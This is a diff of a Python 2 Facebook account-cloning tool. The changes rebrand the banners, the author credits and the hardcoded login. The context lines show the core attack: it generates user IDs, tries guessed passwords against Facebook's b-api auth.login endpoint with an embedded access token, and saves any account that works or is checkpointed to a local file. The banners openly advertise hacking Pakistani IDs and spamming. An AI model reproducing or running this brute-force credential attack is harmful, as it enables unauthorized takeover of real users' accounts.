@@ -82,94 +82,93 @@ os.system("clear")
 print  """
  
  
- 
-  o__ __o                  o                            o         
- <|     v\                <|>                          <|>        
- / \     <\               / \                          / >        
- \o/     o/     o__ __o/  \o/    o__ __o        __o__  \o__ __o   
-  |__  _<|     /v     |    |    /v     v\      />  \    |     v\  
-  |       \   />     / \  / \  />       <\   o/        / \     <\ 
- <o>      /   \      \o/  \o/  \         /  <|         \o/     o/ 
-  |      o     o      |    |    o       o    \\         |     <|  
- / \  __/>     <\__  / \  / \   <\__ __/>     _\o__</  / \    / \ 
-                                                                  
-                                                                  
-                                                                  
-                                    
- \033[1;91m   LOVE YOU HATERS
+██████╗     ██╗  ██╗
+██╔cp account after 7 days ║ ██╔╝
+██80% ids ██╔╝ 
+██╔Just now open═██╗ 
+Mateen █╗
+╚═╝  ╚═╝    ╚═╝  ╚═╝
+ \033[1;91m   FUCK YOU HATERS
  
  
  
-\033[1;96m---------------------BRAND-BALOCH---------------------
+\033[1;96m---------------------Sylhety-Hacker---------------------
                 
 \033[0;95m╭════════════════════════════════════════════╮
-\033[0;91m║\033[0;92mAUTHOR : \033[0;92mMAHDI HASAN.                                
-\033[0;91m║\033[0;91m FB :\033[0;92m "MAHDI HASAN"                                             
+\033[0;91m║\033[0;92mAUTHOR : \033[0;92m MAHDI HASAN.                                
+\033[0;91m║\033[0;91m FB :\033[0;92m "Mahdi Hasan Shuvo"                                             
 \033[0;95m╰════════════════════════════════════════════╯
              
                 
-\033[1;96m----------------- WAJA DY DHOL----------------------
+\033[1;96m-----------------If you are bad Then I am your dad----------------------
 """
  
 ####Logo####
  
-logo1 = """
+logo1 = """"""
+\033[1;93m######   #####   ####    ##     ####    ######
+\033[1;93m##  ##  ##  ##  ##   ##  ##     ##  ##    ##
+\033[1;93m##  ##  ##  ## ##    ##  ##     ##   ##   ##
+\033[1;93m##  ######  ## ########  #########    #   ##
+\033[1;93m##          ## ########  ##     ##   ##   ##
+\033[1;93m##          ## ##    ##  ##     ##  ##    ## 
+\033[1;93m##          ## ##    ##  ##     ####    ########
+
+"""
  
     
+\033[1;93m🔴━━━❖Mahdi-Hasan(M.H) ❖❖━━━━🔴
+\033[1;93m
+\033[1;93m♥🛑▆▬▭▬▭▬▭▬▭▬▭▆🛑♥
+\033[1;93m ▛▂▅🛑💢🅚🅘🅝🅖💢🛑▄▂▜
+\033[1;93 m
+\033[1;93m🔴━━━━❖❖UR DAD❖❖━━━━ 🔴
+\033[1;96m We are Mafia Hacker💜
+\033[1;96mOnly Pakistan Id Hack💜
  
-o__ __o                  o                            o         
- <|     v\                <|>                          <|>        
- / \     <\               / \                          / >        
- \o/     o/     o__ __o/  \o/    o__ __o        __o__  \o__ __o   
-  |__  _<|     /v     |    |    /v     v\      />  \    |     v\  
-  |       \   />     / \  / \  />       <\   o/        / \     <\ 
- <o>      /   \      \o/  \o/  \         /  <|         \o/     o/ 
-  |      o     o      |    |    o       o    \\         |     <|  
- / \  __/>     <\__  / \  / \   <\__ __/>     _\o__</  / \    / \ 
-\033[1;96mFOLLOW ON FB💜
-\033[1;96mTHANKS YOU ALL GUYS💜
+\033[1;99m If you face any problem contact me on Whatsapp +92300000000💜
  
-\033[1;99m If you face any problem contact me on Whatsapp +923063450505💜
- 
-\033[1;96m------------------B  R  A  N  D----------------------
+\033[1;96m------------------THE Mateen💜HACKER----------------------
  
  
 \033[0;95m╭════════════════════════════════════════════╮
-\033[0;91m║\033[0;92mAUTHOR : \033[0;92mAHSANBALOCH .                                   
-\033[0;91m║\033[0;91mWP No:\033[0;92m "FOLLOW FB"                                           
+\033[0;91m║\033[0;92mAUTHOR : \033[0;92mMAHDI HASAN (SHUVO)                                  
+\033[0;91m║\033[0;91mWP No:\033[0;92m "Asa but debo na" 
+\033[0;91m║\033[0;91mNed A gf (Iam read in class 10)				
 \033[0;95m╰════════════════════════════════════════════╯
  
-\033[1;96m-----------------B  R  A  N  D------------------------
+\033[1;96m-----------------Mateen💜HACKER------------------------
 """
-logo2 = """
- 
-  o__ __o                  o                            o         
- <|     v\                <|>                          <|>        
- / \     <\               / \                          / >        
- \o/     o/     o__ __o/  \o/    o__ __o        __o__  \o__ __o   
-  |__  _<|     /v     |    |    /v     v\      />  \    |     v\  
-  |       \   />     / \  / \  />       <\   o/        / \     <\ 
- <o>      /   \      \o/  \o/  \         /  <|         \o/     o/ 
-  |      o     o      |    |    o       o    \\         |     <|  
- / \  __/>     <\__  / \  / \   <\__ __/>     _\o__</  / \    / \ 
-                                                                  
-                                                                  
-                                                                  
- \033[1;91m   LOVE YOU HATERS
+logo2 ="""
+######   #####   ####    ##     ####    ######
+##  ##  ##  ##  ##   ##  ##     ##  ##    ##
+##  ##  ##  ## ##    ##  ##     ##   ##   ##
+##  ######  ## ########  #########    #   ##
+##          ## ########  ##     ##   ##   ##
+##          ## ##    ##  ##     ##  ##    ## 
+##          ## ##    ##  ##     ####    ########
+"""
+███Mateen╗
+██.       Hacker██╔╝
+██cp ids open 7 days ███╔╝ 
+██╔80%ids just now open╔═██╗ 
+██║  pray for me ██╗
+╚═╝  ╚═╝    ╚═╝  ╚═╝
+ \033[1;91m   FUCK YOU HATERS
    
-\033[1;91m 🔴━━━❖❖B A L O C H-B R A N D )❖❖━━━━🔴
-\033[1;91m BALOCH BRAND AAY BRAND
+\033[1;91m 🔴━━━❖❖Mateen-Hacker(M.H)❖❖━━━━🔴
+\033[1;91m  TAWADA PAO 
  
-\033[1;96m--------------------- A🚫N--------------------
+\033[1;96m--------------------- AM--------------------
  
     
  
-\033[1;95mTAWADA OFFICAIL PAOO AHSAN.BALOCH”
+\033[1;95mTAWADA OFFICAIL PAOO MAHDI HASAN”
                                                 
-\033[1;96m--------------------- B A L O C H-B R A N D--------------------
+\033[1;96m--------------------- Sylhety Hacker --------------------
 """
-CorrectUsername = "AN"
-CorrectPassword = "NA"
+CorrectUsername = "MAHDI"
+CorrectPassword = "HASAN"
  
 loop = 'true'
 while (loop == 'true'):
@@ -182,10 +181,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;94mWrong Password"
-            os.system('xdg-open https://wa.me/+923188214452 ')
+            os.system('xdg-open https://web.facebook.com/mahdi80808 ')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://wa.me/+923188214452 ')
+        os.system('xdg-open https://web.facebook.com/mahdi80808 ')
  
  
  
@@ -215,9 +214,9 @@ def Zeek():
     print logo1
     print '\x1b[1;93m[1]  START CLONING'
     time.sleep(0.10)
-    print '\x1b[1;94m[2]SELECT 1 '
+    print '\x1b[1;94m[2] KHOTI DYA 1 SELECT KAR '
     time.sleep(0.10)
-    print '\x1b[1;96m[3] OK ID KO JUST NOW OPEN'
+    print '\x1b[1;96m[3] OK ID KO JUST NOW OPEN KAR'
     time.sleep(0.10)
     print '\x1b[1;97m[4] CLONING ERROR'
     time.sleep(0.10)
@@ -253,7 +252,13 @@ def action():
         action()
     print 50* '\033[1;94m-'
     xxx = str(len(id))
-    jalan('\033[1;96m▬PROGRAMED BY BALOCH')
+    jalan('\033[1;96m▬PROGRAMED BY Mahdi')
+    jalan("\033[1;96m▬▬DOCTOR OF HACKING AND SPAMING")
+    jalan('\033[1;96m▬▬▬PROGRAMER')
+    jalan('\033[1;96m▬▬▬▬SPAMING')
+    jalan("\033[1;96m▬▬▬▬▬HACKER")
+    jalan("\033[1;96m▬▬▬▬▬▬THE WARNING ZONE 2.0")
+    jalan('\033[1;96m▬▬▬▬▬▬▬ENJOY')
  
     jalan ('\033[1;96m Total Number of IDs: '+xxx)
     jalan ('\033[1;95mCode you choosed: '+c)
@@ -296,7 +301,7 @@ def action():
                         oks.append(c+user+pass2)
                     else:
                         if 'www.facebook.com' in q['error_msg']:
-                            print '\033[1;92m(🥺aftr-7-open) ' + k + c + user + '  |  ' + pass2
+                            print '\033[1;92m(MAHDI-7day-open) ' + k + c + user + '  |  ' + pass2
                             cps = open('save/cloned.txt', 'a')
                             cps.write(k+c+user+pass2+'\n')
                             cps.close()
@@ -306,7 +311,7 @@ def action():
                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                             q = json.load(data)
                             if 'access_token' in q:
-                                print '\x1b[1;92m(oftr-7-open)  ' + k + c + user + '  |  ' + pass3
+                                print '\x1b[1;92m(MAHDI-7day-open)  ' + k + c + user + '  |  ' + pass3
                                 okb = open('save/cloned.txt', 'a')
                                 okb.write(k+c+user+pass3+'\n')
                                 okb.close()
@@ -330,7 +335,7 @@ def action():
                                         oks.append(c+user+pass4)
                                     else:
                                         if 'www.facebook.com' in q['error_msg']:
-                                            print '\033[1;92m(LOCK-BRAND) ' + k + c + user + '  |  ' + pass4
+                                            print '\033[1;92m(LOCK-MAHDI) ' + k + c + user + '  |  ' + pass4
                                             cps = open('save/cloned.txt', 'a')
                                             cps.write(k+c+user+pass4+'\n')
                                             cps.close()
@@ -397,4 +402,3 @@ def action():
           
 if __name__ == '__main__':
     login()
- 
